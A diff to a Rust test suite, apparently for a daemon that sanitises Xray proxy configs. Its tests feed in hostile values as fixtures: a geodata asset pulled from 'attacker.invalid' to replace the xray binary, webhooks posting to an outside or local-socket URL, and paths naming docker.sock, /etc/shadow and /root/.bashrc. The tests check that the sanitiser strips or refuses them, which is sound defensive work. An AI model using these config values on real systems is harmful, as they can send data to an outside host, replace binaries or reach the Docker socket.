@@ -653,8 +653,6 @@ fn xray_sections_are_allowlisted_and_geodata_is_dropped() {
 #[test]
 fn master_key_logs_are_stripped_at_any_depth() {
     let input = br#"{
-        "inbounds":[{"protocol":"socks","port":1,"streamSettings":{"security":"tls",
-            "tlsSettings":{"masterKeyLog":"/etc/nologin","certificates":[]}}}],
         "outbounds":[
             {"protocol":"vless","streamSettings":{"security":"tls","tlsSettings":{"MasterKeyLog":"C:/Windows/x"}}},
             {"protocol":"vless","streamSettings":{"security":"reality","realitySettings":{"masterkeylog":"/root/.bashrc","publicKey":"k"}}},
@@ -738,34 +736,543 @@ fn tun_auto_redirect_fallback_rule_index_is_dropped() {
     );
 }
 
+/// A realistic provider bridge: loopback SOCKS inbounds (one per Mihomo `socks5` proxy) and
+/// the usual client outbounds, DNS, routing and a balancer, plus the daemon's endpoint-DNS
+/// overlay (`sockopt.interface`, a scoped DNS server and its routing rule).
+const BRIDGE_XRAY: &str = r#"{
+  "log": {"loglevel": "warning"},
+  "dns": {
+    "servers": [
+      {"address": "localhost", "domains": [], "skipFallback": true},
+      {"address": "77.88.8.8", "domains": ["full:edge.example.com"], "skipFallback": true,
+       "finalQuery": true, "tag": "multicore-endpoint-dns", "timeoutMs": 1200},
+      "https://1.1.1.1/dns-query", "tcp://8.8.8.8:53", "fakedns",
+      {"address": "8.8.4.4", "port": 53, "domains": ["domain:google.com"], "expectIPs": ["8.8.8.0/24"]}
+    ],
+    "hosts": {"domain:router.lan": "192.168.0.1"},
+    "queryStrategy": "UseIPv4"
+  },
+  "fakedns": [{"ipPool": "198.18.0.0/15", "poolSize": 65535}],
+  "inbounds": [
+    {"tag": "reality-in", "listen": "127.0.0.1", "port": 20001, "protocol": "socks",
+     "settings": {"auth": "noauth", "udp": true, "ip": "127.0.0.1"},
+     "sniffing": {"enabled": true, "destOverride": ["http", "tls", "quic"], "routeOnly": true}},
+    {"tag": "vmess-in", "listen": "127.0.0.1", "port": 20002, "protocol": "socks",
+     "settings": {"auth": "password", "accounts": [{"user": "u", "pass": "p"}], "udp": false,
+                  "userLevel": 0}},
+    {"tag": "trojan-in", "listen": "127.0.0.1", "port": 20003, "protocol": "socks",
+     "settings": {"udp": true}, "sniffing": {"enabled": false, "metadataOnly": false}},
+    {"tag": "ss-in", "listen": "127.0.0.1", "port": 20004, "protocol": "socks"},
+    {"tag": "wg-in", "listen": "127.0.0.1", "port": 20005, "protocol": "socks",
+     "settings": {"udp": true}},
+    {"tag": "hy2-in", "listen": "127.0.0.1", "port": 20006, "protocol": "socks",
+     "settings": {"udp": true}},
+    {"tag": "auto-in", "listen": "127.0.0.1", "port": 20007, "protocol": "socks",
+     "settings": {"udp": true}}
+  ],
+  "outbounds": [
+    {"tag": "reality", "protocol": "vless",
+     "settings": {"vnext": [{"address": "edge.example.com", "port": 443,
+       "users": [{"id": "a9d2c132-a196-4310-9776-192ee7e9ebbf", "encryption": "none", "flow": ""}]}]},
+     "streamSettings": {"network": "xhttp", "security": "reality",
+       "xhttpSettings": {"path": "/xh/path", "mode": "auto", "host": "edge.example.com"},
+       "realitySettings": {"serverName": "www.microsoft.com", "fingerprint": "chrome",
+         "password": "xQ3kD9mT2vB7nR4wY8pL1sF6hJ0cZ5gA9eK2uN7tW3o", "shortId": "a1b2c3d4e5f60718",
+         "spiderX": "/"},
+       "sockopt": {"interface": "eth0", "domainStrategy": "ForceIP"}}},
+    {"tag": "vmess", "protocol": "vmess",
+     "settings": {"vnext": [{"address": "vm.example.com", "port": 443,
+       "users": [{"id": "a9d2c132-a196-4310-9776-192ee7e9ebbf", "security": "auto"}]}]},
+     "streamSettings": {"network": "ws", "security": "tls",
+       "wsSettings": {"path": "/ws?ed=2048", "host": "vm.example.com",
+                      "headers": {"User-Agent": "Mozilla/5.0"}},
+       "tlsSettings": {"serverName": "vm.example.com", "alpn": ["http/1.1"],
+                       "fingerprint": "chrome"}},
+     "mux": {"enabled": true, "concurrency": 8}},
+    {"tag": "trojan", "protocol": "trojan",
+     "settings": {"servers": [{"address": "tj.example.com", "port": 443, "password": "secret"}]},
+     "streamSettings": {"network": "grpc", "security": "tls",
+       "grpcSettings": {"serviceName": "tunnel", "multiMode": true},
+       "tlsSettings": {"serverName": "tj.example.com"}}},
+    {"tag": "ss", "protocol": "shadowsocks",
+     "settings": {"servers": [{"address": "203.0.113.10", "port": 8388,
+       "method": "chacha20-ietf-poly1305", "password": "secret"}]}},
+    {"tag": "wg", "protocol": "wireguard",
+     "settings": {"secretKey": "4LkDGcXGCz+lSavd+9/xGINpfvgsWSXzoFLxPzKAdFA=",
+       "address": ["10.0.0.2/32", "fd00::2/128"], "mtu": 1420,
+       "peers": [{"publicKey": "QJKMbtVAIGSCQLZqIlZfx1O+bZzfgdbwZZI6VW3mhnI=",
+                  "endpoint": "wg.example.com:51820", "allowedIPs": ["0.0.0.0/0", "::/0"]}]}},
+    {"tag": "hy2", "protocol": "hysteria",
+     "settings": {"version": 2, "address": "hy.example.com", "port": 443},
+     "streamSettings": {"network": "hysteria", "security": "tls",
+       "hysteriaSettings": {"version": 2, "auth": "secret"},
+       "tlsSettings": {"serverName": "hy.example.com", "alpn": ["h3"]}}},
+    {"tag": "direct", "protocol": "freedom", "settings": {"domainStrategy": "UseIPv4"}},
+    {"tag": "multicore-endpoint-dns-direct", "protocol": "freedom",
+     "settings": {"domainStrategy": "AsIs"},
+     "streamSettings": {"sockopt": {"domainStrategy": "AsIs"}}},
+    {"tag": "block", "protocol": "blackhole"},
+    {"tag": "dns-out", "protocol": "dns", "settings": {"address": "1.1.1.1", "port": 53}}
+  ],
+  "routing": {
+    "domainStrategy": "IPIfNonMatch",
+    "rules": [
+      {"type": "field", "inboundTag": ["multicore-endpoint-dns"],
+       "outboundTag": "multicore-endpoint-dns-direct"},
+      {"type": "field", "inboundTag": ["reality-in"], "outboundTag": "reality"},
+      {"type": "field", "inboundTag": ["vmess-in"], "outboundTag": "vmess"},
+      {"type": "field", "inboundTag": ["trojan-in"], "outboundTag": "trojan"},
+      {"type": "field", "inboundTag": ["ss-in"], "outboundTag": "ss"},
+      {"type": "field", "inboundTag": ["wg-in"], "outboundTag": "wg"},
+      {"type": "field", "inboundTag": ["hy2-in"], "outboundTag": "hy2"},
+      {"type": "field", "inboundTag": ["auto-in"], "balancerTag": "auto"},
+      {"type": "field", "port": 53, "network": "udp", "outboundTag": "dns-out"},
+      {"type": "field", "ip": ["10.0.0.0/8", "192.168.0.0/16", "fc00::/7"], "outboundTag": "direct"},
+      {"type": "field", "domain": ["domain:ads.example.com", "keyword:tracker"], "outboundTag": "block",
+       "ruleTag": "ads"}
+    ],
+    "balancers": [{"tag": "auto", "selector": ["reality", "vmess", "trojan"],
+                   "strategy": {"type": "leastPing"}, "fallbackTag": "direct"}]
+  },
+  "observatory": {"subjectSelector": ["reality", "vmess", "trojan"],
+                  "probeURL": "https://www.google.com/generate_204", "probeInterval": "5m"},
+  "policy": {"levels": {"0": {"handshake": 4, "connIdle": 300}},
+             "system": {"statsOutboundUplink": false}}
+}"#;
+
+/// Lane H1 round 4: a realistic bridge config survives unchanged, apart from wireguard running
+/// in userspace (`noKernelTun: true`).
+#[test]
+fn realistic_bridge_configs_pass_unchanged() {
+    let input: serde_json::Value = serde_json::from_str(BRIDGE_XRAY).unwrap();
+    let output: serde_json::Value =
+        serde_json::from_slice(&sanitize_xray(BRIDGE_XRAY.as_bytes()).unwrap()).unwrap();
+    let mut expected = input.clone();
+    expected["outbounds"][4]["settings"]["noKernelTun"] = true.into();
+    assert_eq!(output, expected);
+    // A user's `noKernelTun: false` does not survive either.
+    let forced = sanitize_xray(
+        br#"{"outbounds":[{"protocol":"WireGuard","settings":{"NoKernelTun":false,"secretKey":"k"}}]}"#,
+    )
+    .unwrap();
+    let forced: serde_json::Value = serde_json::from_slice(&forced).unwrap();
+    assert_eq!(
+        forced["outbounds"][0]["settings"],
+        serde_json::json!({"secretKey": "k", "noKernelTun": true})
+    );
+    // The idle config of a Mihomo-only subscription passes too.
+    sanitize_xray(multicore_core::IDLE_XRAY_CONFIG).unwrap();
+}
+
+/// Re-review 3 H1R3-1: a routing rule keeps only its matchers and target, so `webhook` (whose
+/// notifier POSTs to any URL or unix socket with the core's privileges) never reaches Xray.
+#[test]
+fn routing_rules_keep_only_matchers_and_targets() {
+    let out = sanitize_xray(
+        br#"{"routing":{"domainStrategy":"AsIs","futureKey":1,
+            "rules":[{"type":"field","inboundTag":["in"],"outboundTag":"direct",
+              "webhook":{"url":"https://example.com/hook","headers":{"X":"y"}},
+              "Webhook2":{},"somethingNew":{"url":"https://example.com"}}],
+            "balancers":[{"tag":"b","selector":["a"],"strategy":{"type":"leastLoad",
+              "settings":{"maxRTT":"1s"},"extra":1},"hook":{}}]}}"#,
+    )
+    .unwrap();
+    let doc: serde_json::Value = serde_json::from_slice(&out).unwrap();
+    assert_eq!(
+        doc["routing"],
+        serde_json::json!({"domainStrategy":"AsIs",
+            "rules":[{"type":"field","inboundTag":["in"],"outboundTag":"direct"}],
+            "balancers":[{"tag":"b","selector":["a"],
+                "strategy":{"type":"leastLoad","settings":{"maxRTT":"1s"}}}]})
+    );
+    // Case variants are dropped the same way.
+    let out = sanitize_xray(
+        br#"{"Routing":{"Rules":[{"OutboundTag":"d","WEBHOOK":{"url":"https://x"}}]}}"#,
+    )
+    .unwrap();
+    assert!(!String::from_utf8(out).unwrap().contains("WEBHOOK"));
+    // A webhook aimed at a local socket is refused outright (the endpoint rule).
+    for url in [
+        "/run/docker.sock:/containers/x/kill",
+        "@abstract:/x",
+        "unix:///run/docker.sock",
+        "http+unix://%2Frun%2Fdocker.sock/x",
+    ] {
+        let input = format!(
+            r#"{{"routing":{{"rules":[{{"inboundTag":["in"],"outboundTag":"direct","webhook":{{"url":"{url}"}}}}]}}}}"#
+        );
+        assert_eq!(
+            sanitize_xray(input.as_bytes()),
+            Err(SanitizeError::LocalEndpoint(
+                "$.routing.rules[0].webhook.url".into()
+            )),
+            "{url}"
+        );
+    }
+}
+
+/// Lane H1 round 4: an inbound is exactly a loopback SOCKS bridge. Re-review 3 H1R3-2/H1R3-3:
+/// no `streamSettings` on an inbound, so no REALITY `target` and no hysteria `masquerade`.
+#[test]
+fn inbounds_must_be_exactly_a_loopback_socks_bridge() {
+    let refused = |inbound: &str| {
+        sanitize_xray(format!(r#"{{"inbounds":[{inbound}]}}"#).as_bytes()).unwrap_err()
+    };
+    let field = |name: &str| SanitizeError::ForbiddenField(format!("inbounds[0].{name}"));
+    let base = r#""listen":"127.0.0.1","port":1080,"protocol":"socks""#;
+    assert_eq!(
+        refused(&format!(
+            r#"{{{base},"streamSettings":{{"security":"reality","realitySettings":{{"target":"example.com:443","serverNames":["a"],"privateKey":"k","shortIds":[""]}}}}}}"#
+        )),
+        field("streamSettings")
+    );
+    assert_eq!(
+        refused(&format!(r#"{{{base},"streamSettings":{{}}}}"#)),
+        field("streamSettings")
+    );
+    assert_eq!(
+        refused(&format!(
+            r#"{{{base},"StreamSettings":{{"sockopt":{{"mark":1}}}}}}"#
+        )),
+        field("StreamSettings")
+    );
+    for extra in [
+        r#""allocate":{"strategy":"always"}"#,
+        r#""security":"tls""#,
+        r#""tlsSettings":{}"#,
+        r#""realitySettings":{}"#,
+        r#""futureField":1"#,
+    ] {
+        let name = extra.split('"').nth(1).unwrap();
+        assert_eq!(
+            refused(&format!("{{{base},{extra}}}")),
+            field(name),
+            "{extra}"
+        );
+    }
+    // REALITY `target`/`dest` as a local socket, and hysteria `masquerade`, are refused even
+    // before the shape check.
+    for target in ["/run/docker.sock", "@abstract", "@@padded"] {
+        for key in ["target", "dest"] {
+            assert_eq!(
+                refused(&format!(
+                    r#"{{{base},"streamSettings":{{"security":"reality","realitySettings":{{"{key}":"{target}"}}}}}}"#
+                )),
+                SanitizeError::LocalEndpoint(format!(
+                    "$.inbounds[0].streamSettings.realitySettings.{key}"
+                ))
+            );
+        }
+    }
+    assert_eq!(
+        refused(&format!(
+            r#"{{{base},"streamSettings":{{"security":"reality","realitySettings":{{"type":"unix","dest":"run/x.sock"}}}}}}"#
+        )),
+        SanitizeError::LocalEndpoint("$.inbounds[0].streamSettings.realitySettings.type".into())
+    );
+    assert_eq!(
+        refused(&format!(
+            r#"{{{base},"streamSettings":{{"network":"hysteria","hysteriaSettings":{{"version":2,"masquerade":{{"type":"file","dir":"/"}}}}}}}}"#
+        )),
+        SanitizeError::ForbiddenField(
+            "$.inbounds[0].streamSettings.hysteriaSettings.masquerade".into()
+        )
+    );
+    // Settings: only the SOCKS server fields, with a loopback UDP address.
+    let settings =
+        |name: &str| SanitizeError::ForbiddenField(format!("inbounds[0].settings.{name}"));
+    assert_eq!(
+        refused(&format!(r#"{{{base},"settings":{{"clients":[]}}}}"#)),
+        settings("clients")
+    );
+    assert_eq!(
+        refused(&format!(
+            r#"{{{base},"settings":{{"auth":"certificate"}}}}"#
+        )),
+        settings("auth")
+    );
+    assert_eq!(
+        refused(&format!(
+            r#"{{{base},"settings":{{"accounts":[{{"user":"u","pass":"p","level":1}}]}}}}"#
+        )),
+        settings("accounts[0].level")
+    );
+    assert_eq!(
+        refused(&format!(r#"{{{base},"settings":{{"ip":"0.0.0.0"}}}}"#)),
+        SanitizeError::NonLoopbackListener("inbounds[0].settings.ip".into())
+    );
+    assert_eq!(
+        refused(&format!(
+            r#"{{{base},"sniffing":{{"enabled":true,"future":1}}}}"#
+        )),
+        field("sniffing.future")
+    );
+    // One fixed port.
+    for port in [r#""1000-2000""#, "0", "70000", r#""env:PORT""#, "null"] {
+        assert_eq!(
+            refused(&format!(
+                r#"{{"listen":"127.0.0.1","protocol":"socks","port":{port}}}"#
+            )),
+            field("port"),
+            "{port}"
+        );
+    }
+    assert_eq!(
+        refused(r#"{"listen":"127.0.0.1","protocol":"socks"}"#),
+        field("port")
+    );
+    // Accepted forms are written back canonically.
+    let out = sanitize_xray(
+        br#"{"inbounds":[{"Tag":"a","PORT":"1080","Protocol":"SOCKS","Settings":{"UDP":true}}]}"#,
+    )
+    .unwrap();
+    let doc: serde_json::Value = serde_json::from_slice(&out).unwrap();
+    assert_eq!(
+        doc["inbounds"][0],
+        serde_json::json!({"tag":"a","listen":"127.0.0.1","port":1080,"protocol":"socks",
+            "settings":{"udp":true}})
+    );
+}
+
+/// Lane H1 round 4: no endpoint anywhere may be a local socket or file, whatever section or
+/// protocol carries it. HTTP paths (`/ws`, gRPC and xhttp paths) are not endpoints.
+#[test]
+fn endpoints_never_name_a_local_socket_or_file() {
+    let local_forms = [
+        "/run/docker.sock",
+        "@abstract",
+        "@@padded",
+        "\\\\.\\pipe\\docker_engine",
+        "C:\\Windows\\System32\\config\\SAM",
+        "c:/x",
+        "unix:/run/x.sock",
+        "UNIX:///run/x.sock",
+        "file:///etc/shadow",
+        "http+unix://%2Frun%2Fx/",
+        " /run/x.sock",
+        "a\u{0}b",
+    ];
+    let cases: &[(&str, &str)] = &[
+        (
+            r#"{"outbounds":[{"protocol":"vless","settings":{"vnext":[{"address":"@X@","port":1}]}}]}"#,
+            "$.outbounds[0].settings.vnext[0].address",
+        ),
+        (
+            r#"{"outbounds":[{"protocol":"vless","settings":{"address":"@X@","port":1}}]}"#,
+            "$.outbounds[0].settings.address",
+        ),
+        (
+            r#"{"outbounds":[{"protocol":"freedom","settings":{"redirect":"@X@"}}]}"#,
+            "$.outbounds[0].settings.redirect",
+        ),
+        (
+            r#"{"outbounds":[{"protocol":"freedom","sendThrough":"@X@"}]}"#,
+            "$.outbounds[0].sendThrough",
+        ),
+        (
+            r#"{"outbounds":[{"protocol":"dns","settings":{"rewriteAddress":"@X@"}}]}"#,
+            "$.outbounds[0].settings.rewriteAddress",
+        ),
+        (
+            r#"{"outbounds":[{"protocol":"wireguard","settings":{"peers":[{"endpoint":"@X@"}]}}]}"#,
+            "$.outbounds[0].settings.peers[0].endpoint",
+        ),
+        (
+            r#"{"outbounds":[{"protocol":"vless","streamSettings":{"security":"reality","realitySettings":{"target":"@X@"}}}]}"#,
+            "$.outbounds[0].streamSettings.realitySettings.target",
+        ),
+        (
+            r#"{"outbounds":[{"protocol":"vless","streamSettings":{"network":"xhttp","xhttpSettings":{"extra":{"downloadSettings":{"address":"@X@"}}}}}]}"#,
+            "$.outbounds[0].streamSettings.xhttpSettings.extra.downloadSettings.address",
+        ),
+        (
+            r#"{"outbounds":[{"protocol":"vless","streamSettings":{"wsSettings":{"host":"@X@"}}}]}"#,
+            "$.outbounds[0].streamSettings.wsSettings.host",
+        ),
+        (r#"{"dns":{"servers":["@X@"]}}"#, "$.dns.servers[0]"),
+        (
+            r#"{"dns":{"servers":[{"address":"@X@"}]}}"#,
+            "$.dns.servers[0].address",
+        ),
+        (
+            r#"{"observatory":{"probeURL":"@X@"}}"#,
+            "$.observatory.probeURL",
+        ),
+        (
+            r#"{"burstObservatory":{"pingConfig":{"destination":"@X@","connectivity":"https://x"}}}"#,
+            "$.burstObservatory.pingConfig.destination",
+        ),
+        (
+            r#"{"outbounds":[{"protocol":"vless","streamSettings":{"finalmask":{"realm":{"url":"@X@"}}}}]}"#,
+            "$.outbounds[0].streamSettings.finalmask.realm.url",
+        ),
+    ];
+    for (template, at) in cases {
+        for form in local_forms {
+            let escaped = serde_json::to_string(form).unwrap();
+            let input = template.replace("\"@X@\"", &escaped);
+            assert_eq!(
+                sanitize_xray(input.as_bytes()),
+                Err(SanitizeError::LocalEndpoint((*at).to_owned())),
+                "{input}"
+            );
+        }
+    }
+    // A unix `network`/`type` is refused too.
+    assert_eq!(
+        sanitize_xray(br#"{"outbounds":[{"protocol":"dns","settings":{"network":"unix"}}]}"#),
+        Err(SanitizeError::LocalEndpoint(
+            "$.outbounds[0].settings.network".into()
+        ))
+    );
+    // Paths are not endpoints; host names and IPs are fine.
+    sanitize_xray(
+        br#"{"outbounds":[{"protocol":"vless","settings":{"address":"a.example","port":443},
+            "streamSettings":{"network":"ws","wsSettings":{"path":"/ws","host":"a.example"},
+              "grpcSettings":{"serviceName":"/grpc"},"xhttpSettings":{"path":"/xh"},
+              "tcpSettings":{"header":{"type":"http","request":{"path":["/"],
+                "headers":{"Host":["a.example"]}}}}}},
+          {"protocol":"freedom","settings":{"redirect":"127.0.0.1:53"}}]}"#,
+    )
+    .unwrap();
+}
+
+/// Lane H1 round 4: server-only features and raw socket powers are refused wherever they
+/// appear; outbounds keep only their documented fields and a known protocol.
+#[test]
+fn server_only_features_are_refused_everywhere() {
+    for (input, at) in [
+        (
+            r#"{"outbounds":[{"protocol":"hysteria","streamSettings":{"hysteriaSettings":{"masquerade":{"type":"proxy","url":"https://x"}}}}]}"#,
+            "$.outbounds[0].streamSettings.hysteriaSettings.masquerade",
+        ),
+        (
+            r#"{"outbounds":[{"protocol":"vless","settings":{"fallbacks":[{"dest":80}]}}]}"#,
+            "$.outbounds[0].settings.fallbacks",
+        ),
+        (
+            r#"{"outbounds":[{"protocol":"vless","settings":{"Decryption":"none"}}]}"#,
+            "$.outbounds[0].settings.Decryption",
+        ),
+        (
+            r#"{"outbounds":[{"protocol":"vless","streamSettings":{"tlsSettings":{"echServerKeys":"x"}}}]}"#,
+            "$.outbounds[0].streamSettings.tlsSettings.echServerKeys",
+        ),
+        (
+            r#"{"outbounds":[{"protocol":"freedom","streamSettings":{"sockopt":{"customSockopt":[{"level":"0","opt":"19","value":"1"}]}}}]}"#,
+            "$.outbounds[0].streamSettings.sockopt.customSockopt",
+        ),
+        (
+            r#"{"outbounds":[{"protocol":"freedom","streamSettings":{"sockopt":{"tproxy":"tproxy"}}}]}"#,
+            "$.outbounds[0].streamSettings.sockopt.tproxy",
+        ),
+        (
+            r#"{"dns":{"deep":[{"MASQUERADE":{}}]}}"#,
+            "$.dns.deep[0].MASQUERADE",
+        ),
+    ] {
+        assert_eq!(
+            sanitize_xray(input.as_bytes()),
+            Err(SanitizeError::ForbiddenField(at.to_owned())),
+            "{input}"
+        );
+    }
+    sanitize_xray(
+        br#"{"outbounds":[{"protocol":"freedom","streamSettings":{"sockopt":{"tproxy":"off"}}}]}"#,
+    )
+    .unwrap();
+    // Unknown outbound fields are dropped; an unknown or missing protocol is refused.
+    let out = sanitize_xray(
+        br#"{"outbounds":[{"protocol":"Freedom","tag":"d","listen":"0.0.0.0","allocate":{},"x":1}]}"#,
+    )
+    .unwrap();
+    let doc: serde_json::Value = serde_json::from_slice(&out).unwrap();
+    assert_eq!(
+        doc["outbounds"][0],
+        serde_json::json!({"protocol":"Freedom","tag":"d"})
+    );
+    for outbound in [
+        r#"{"protocol":"tun"}"#,
+        r#"{"protocol":"dokodemo-door"}"#,
+        r#"{"tag":"x"}"#,
+    ] {
+        assert_eq!(
+            sanitize_xray(format!(r#"{{"outbounds":[{outbound}]}}"#).as_bytes()),
+            Err(SanitizeError::ForbiddenProtocol(
+                "outbounds[0].protocol".into()
+            )),
+            "{outbound}"
+        );
+    }
+}
+
 /// Live check against the pinned Xray (run on the build host):
 /// `MULTICORE_LIVE_XRAY=/path/to/xray cargo test -p multicore-core --test config_sanitize -- --ignored`.
 /// The pinned core must accept the sanitised adversarial config as-is, with nothing left of
-/// `geodata` or `masterKeyLog`.
+/// `geodata`, `masterKeyLog` or a routing `webhook`.
 #[test]
 #[ignore = "needs MULTICORE_LIVE_XRAY pointing at the pinned Xray binary"]
 fn live_pinned_xray_accepts_the_sanitised_adversarial_config() {
-    let xray = std::env::var_os("MULTICORE_LIVE_XRAY").expect("MULTICORE_LIVE_XRAY");
     let input = br#"{"log":{"loglevel":"warning","access":"/tmp/zz-access"},
         "geodata":{"cron":"* * * * *","assets":[{"url":"https://attacker.invalid/x","file":"xray"}]},
         "api":{"tag":"api","listen":"0.0.0.0:10085","services":["HandlerService"]},
         "metrics":{"tag":"m","listen":"0.0.0.0:11111"},
         "inbounds":[{"protocol":"socks","port":18119,"settings":{"udp":true}}],
         "outbounds":[{"protocol":"freedom","tag":"direct","streamSettings":{"security":"tls",
-            "tlsSettings":{"serverName":"example.com","masterKeyLog":"/tmp/zz-keylog"}}}]}"#;
+            "tlsSettings":{"serverName":"example.com","masterKeyLog":"/tmp/zz-keylog"}}},
+          {"protocol":"wireguard","tag":"wg","futureField":{"x":1},"settings":{"noKernelTun":false,
+            "secretKey":"4LkDGcXGCz+lSavd+9/xGINpfvgsWSXzoFLxPzKAdFA=","address":["10.0.0.2/32"],
+            "peers":[{"publicKey":"QJKMbtVAIGSCQLZqIlZfx1O+bZzfgdbwZZI6VW3mhnI=",
+              "endpoint":"wg.example.com:51820"}]}}],
+        "routing":{"rules":[{"inboundTag":["x"],"outboundTag":"direct",
+            "webhook":{"url":"https://attacker.invalid/zz-hook","headers":{"X":"y"}}}]}}"#;
     let out = sanitize_xray(input).unwrap();
     let text = String::from_utf8(out.clone()).unwrap();
-    for gone in ["geodata", "masterKeyLog", "zz-access", "10085", "11111"] {
+    for gone in [
+        "geodata",
+        "masterKeyLog",
+        "zz-access",
+        "10085",
+        "11111",
+        "webhook",
+        "zz-hook",
+        "futureField",
+    ] {
         assert!(!text.contains(gone), "{gone} survived: {text}");
     }
+    assert!(text.contains(r#""noKernelTun":true"#), "{text}");
+    assert_pinned_xray_accepts(&out);
+}
+
+/// Live check: the realistic bridge config (vless-reality-xhttp, vmess-ws, trojan-grpc,
+/// shadowsocks, wireguard, hysteria2, DNS, routing, balancer) still runs after sanitising.
+#[test]
+#[ignore = "needs MULTICORE_LIVE_XRAY pointing at the pinned Xray binary"]
+fn live_pinned_xray_accepts_the_sanitised_bridge_config() {
+    assert_pinned_xray_accepts(&sanitize_xray(BRIDGE_XRAY.as_bytes()).unwrap());
+}
+
+fn assert_pinned_xray_accepts(config_bytes: &[u8]) {
+    let xray = std::env::var_os("MULTICORE_LIVE_XRAY").expect("MULTICORE_LIVE_XRAY");
     let root = tempfile::tempdir().unwrap();
     let config = root.path().join("xray.json");
-    std::fs::write(&config, &out).unwrap();
-    let status = std::process::Command::new(xray)
+    std::fs::write(&config, config_bytes).unwrap();
+    let assets = std::env::var_os("MULTICORE_LIVE_XRAY_ASSETS")
+        .map_or_else(|| root.path().to_owned(), std::path::PathBuf::from);
+    let output = std::process::Command::new(xray)
         .args(["run", "-test", "-config"])
         .arg(&config)
-        .env("XRAY_LOCATION_ASSET", root.path())
-        .status()
+        .env("XRAY_LOCATION_ASSET", assets)
+        .output()
         .unwrap();
-    assert!(status.success(), "the pinned Xray rejected: {text}");
+    println!("{}", String::from_utf8_lossy(&output.stdout));
+    assert!(
+        output.status.success(),
+        "the pinned Xray rejected: {}
+{}
+{}",
+        String::from_utf8_lossy(config_bytes),
+        String::from_utf8_lossy(&output.stdout),
+        String::from_utf8_lossy(&output.stderr)
+    );
 }
